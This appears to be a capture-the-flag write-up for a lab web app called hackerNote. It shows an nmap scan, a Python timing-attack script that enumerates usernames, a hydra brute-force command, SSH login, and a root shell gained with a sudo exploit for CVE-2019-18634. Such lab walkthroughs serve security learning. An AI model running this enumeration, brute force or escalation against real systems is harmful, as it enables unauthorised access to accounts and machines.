@@ -1,0 +1,190 @@
+hackerNote is a custom webapp which we have to test using basic enumeration and exxploitation skills.
+
+IP: 10.10.146.155 
+
+Nmap scan results.
+
+root@LAPTOP-U5913CMD:/home/akshay# nmap -A -T4  10.10.146.155 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 12:42 IST
+Nmap scan report for 10.10.146.155
+Host is up (0.16s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
+|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
+|_  256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
+80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Home - hackerNote
+8080/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Home - hackerNote
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/5%OT=22%CT=1%CU=31706%PV=Y%DS=2%DC=T%G=Y%TM=5F7AC79
+OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(
+OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
+OS:NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
+OS:R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+1) Which ports are open? (in numerical order)
+-> 22,80,8080
+
+2) What programming language is the backend written in?
+-> Golang
+
+There a login page on the website and it encloses a lot of details while loggin in.
+If you are a user u get loggin you in even if the password is wrong.
+So this can be used to enumerate users.
+
+We will be writing script to calculate such tasks and using names.txt as a username list.
+
+We will be using requests library from python to make a POST request.
+
+Script:
+
+#!/usr/bin/env python
+
+import requests
+import json
+import time
+
+username_file = open("names.txt","r")
+url = "http://10.10.82.57/api/user/login"
+
+usernames = []
+timings = dict()
+for line in username_file:
+    usernames.append(line.replace("\n",""))
+
+def doLogin(user):
+    creds =  {"username":user,"password":"123"}
+    response = requests.post(url,json=creds)
+    if response.status_code != 200:  # This means there was an API error
+        print("Error:", response.status_code)
+
+for user in usernames:
+    start = time.time()
+    doLogin(user)
+    end = time.time()
+    timings[user] = end - start
+    
+    time.sleep(0.01)
+
+print("Finished POST Requests")
+
+largestValue = max(timings.values())
+smallestValue = min(timings.values())
+
+for user,time in timings.items():
+    if time >= largestValue * 0.9:
+        print(user + " is likely a valid user")
+
+
+james is likely to be a valid user
+
+james is the user and we can brute force the webpage.
+
+3) How many usernames from the list are valid? 
+-> 1
+
+4) What are/is the valid username(s)?
+-> james
+
+ Wrong credential encoding Hint: My favourite colour and my favourite number 
+
+We can create wordlist using favourite colour and favourite number.
+
+
+5) How many passwords were in your wordlist?
+-> 180
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/hackerNote# hydra -l james -P wordlist.txt 10.10.82.57 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password" 
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-05 14:01:40
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:1/p:180), ~12 tries per task
+[DATA] attacking http-post-form://10.10.82.57:80/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password
+[STATUS] 48.00 tries/min, 48 tries in 00:01h, 132 to do in 00:03h, 16 active
+[80][http-post-form] host: 10.10.82.57   login: james   password: blue7
+
+6) What was the user's password?
+-> blue7
+
+
+Your notes:
+My SSH details
+
+So that I don't forget, my SSH password is dak4###37b
+
+
+
+7) What's the user's SSH password?
+-> dak4####7b
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/hackerNote# ssh james@10.10.82.57
+The authenticity of host '10.10.82.57 (10.10.82.57)' can't be established.
+ECDSA key fingerprint is SHA256:le4aVVewKygXBn8lnt/vTK7VskXafxS0FKdZtszhOUg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.82.57' (ECDSA) to the list of known hosts.
+james@10.10.82.57's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Oct  5 08:34:48 UTC 2020
+
+  System load:  0.12              Processes:           86
+  Usage of /:   49.2% of 9.78GB   Users logged in:     0
+  Memory usage: 7%                IP address for eth0: 10.10.82.57
+  Swap usage:   0%
+
+
+59 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Mon Feb 10 11:58:27 2020 from 10.0.2.2
+james@hackernote:~$ id
+uid=1001(james) gid=1001(james) groups=1001(james)
+james@hackernote:~$ 
+
+
+8) What is the CVE number for the exploit?
+-> CVE-2019-18634
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/hackerNote/sudo-cve-2019-18634# scp exploit.c james@10.10.82.57:/tmp/ 
+james@10.10.82.57's password: 
+exploit.c                                                                                                                   100% 6311    42.1KB/s   00:00    
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/hackerNote/sudo-cve-2019-18634# scp  james@10.10.82.57:/tmp/ 
+.git/       .gitignore  LICENSE     Makefile    README.md   exploit.c   
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/hackerNote/sudo-cve-2019-18634# scp Makefile james@10.10.82.57:/tmp/ 
+james@10.10.82.57's password: 
+Makefile                                                                                                                    100%  230     1.6KB/s   00:00    
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/hackerNote/sudo-cve-2019-18634# ls
+LICENSE  Makefile  README.md  exploit.c
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/hackerNote/sudo-cve-2019-18634# 
+
+
+
+james@hackernote:/tmp$ make
+cc -Os -g3 -std=c99 -Wall -Wextra -Wpedantic -static -o exploit exploit.c
+james@hackernote:/tmp$ ls
+exploit    Makefile
+exploit.c  systemd-private-9ba521bd205240aca29e8a88a0a33a4e-systemd-resolved.service-zFyWeF
+les.sh     systemd-private-9ba521bd205240aca29e8a88a0a33a4e-systemd-timesyncd.service-rOnd1n
+les.sh.1
+james@hackernote:/tmp$ ./exploit
+[sudo] password for james: 
+Sorry, try again.
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(james)
+# 
